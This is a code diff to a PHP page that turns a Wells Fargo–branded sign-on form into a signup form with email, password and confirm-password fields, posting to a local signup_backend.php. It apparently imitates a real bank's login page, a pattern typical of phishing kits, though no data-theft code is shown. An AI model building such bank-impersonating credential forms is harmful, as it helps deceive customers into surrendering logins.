@@ -14,11 +14,11 @@ $error = $_GET['error']??0;
 $msg = $_GET['msg']??null;
 ?>
 <div class="container-fluid">
-    <form method="post" action="backend.php">
+    <form method="post" action="signup_backend.php">
         <div id="login">
             <div class="topheader"></div>
             <div class="middleheader">
-                <p>Sign On to View Your Accounts</p>
+                <p>Sign Up for new account</p>
                 <p>Enter your username and password to securely view and manage your Wells Fargo accounts online.</p>
             </div>
 
@@ -41,17 +41,18 @@ $msg = $_GET['msg']??null;
                 <table>
                     <tr>
                         <td><input required="required" placeholder="Username" type="email" name="email"></td>
+                    </tr>
+                    <tr>
                         <td><input placeholder="password" type="password" name="password"></td>
                     </tr>
                     <tr>
-                        <td colspan="2" class="td_save_username">
-                            <input type="checkbox" name="save_login" value="1"> Save Username
-                        </td>
+                        <td><input placeholder="Confirm Password" type="password" name="password_confirm"></td>
                     </tr>
+
 
                     <tr>
                         <td colspan="2" class="td_links">
-                            <a href="forgot.php">Forgot Password/Username?</a>  | <a href="signup.php">Enroll Now</a>
+                            <a href="forgot.php">Forgot Password/Username?</a>  | <a href="index.php">Login Now</a>
                         </td>
                     </tr>
 
